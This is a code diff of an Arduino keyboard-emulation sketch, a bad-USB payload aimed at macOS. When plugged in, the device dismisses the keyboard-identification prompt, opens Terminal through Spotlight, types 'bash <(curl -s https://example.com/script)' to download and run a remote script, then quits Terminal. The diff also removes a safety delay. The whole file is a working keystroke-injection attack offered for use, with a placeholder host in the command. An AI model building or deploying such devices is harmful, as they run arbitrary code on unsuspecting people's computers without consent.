@@ -1,41 +1,71 @@
 #include "Arduino.h"
 #include <Keyboard.h>
 
-void setup()
+#ifndef LED_BUILTIN
+#define LED_BUILTIN 13
+#endif
+
+void blink()
+{
+  for (int i=10; i--; i>0)
+  {
+    digitalWrite(LED_BUILTIN, HIGH);
+    delay(i * 100);
+    digitalWrite(LED_BUILTIN, LOW);
+    delay(100);
+  }
+}
+
+void run()
 {
   Keyboard.begin();
-  // 2 Second Delay before the point of no return
-  delay(2000);
+
+  // Ignore keyboard identification
+  Keyboard.press(KEY_LEFT_GUI);
+  delay(50);
+  Keyboard.write('w');
+  delay(50);
+  Keyboard.release(KEY_LEFT_GUI);
+  delay(50);
+
   // Command + Space
   Keyboard.press(KEY_LEFT_GUI);
+  delay(50);
   Keyboard.write(' ');
+  delay(50);
   Keyboard.release(KEY_LEFT_GUI);
-  delay(100);
-  Keyboard.print("terminal");
-  delay(100);
-  // Press Enter
-  Keyboard.print('\n');
-  delay(100);
+  delay(50);
+
+  // Open terminal
+  Keyboard.print("terminal\n");
+  delay(50);
+
   // Clear any previous command line entry
   Keyboard.press(128);
+  delay(50);
   Keyboard.write('c');
+  delay(50);
   Keyboard.release(128);
-  delay(100);
+  delay(50);
+
   // Fun
-  Keyboard.print("bash <(curl -s https://example.com/script)");
-  delay(200);
-  Keyboard.print('\n');
-  delay(100);
-  // Clean up
-  Keyboard.press(128);
-  Keyboard.write('c');
-  Keyboard.release(128);
-  delay(100);
-  // And quit
+  Keyboard.print("bash <(curl -s https://example.com/script)\n");
+  delay(3000);
+
+  // quit
   Keyboard.press(KEY_LEFT_GUI);
+  delay(50);
   Keyboard.write('q');
+  delay(50);
   Keyboard.release(KEY_LEFT_GUI);
-  delay(100);
+  delay(50);
+}
+
+void setup()
+{
+  pinMode(LED_BUILTIN, OUTPUT);
+  blink();
+  run();
 }
 
 void loop() { }
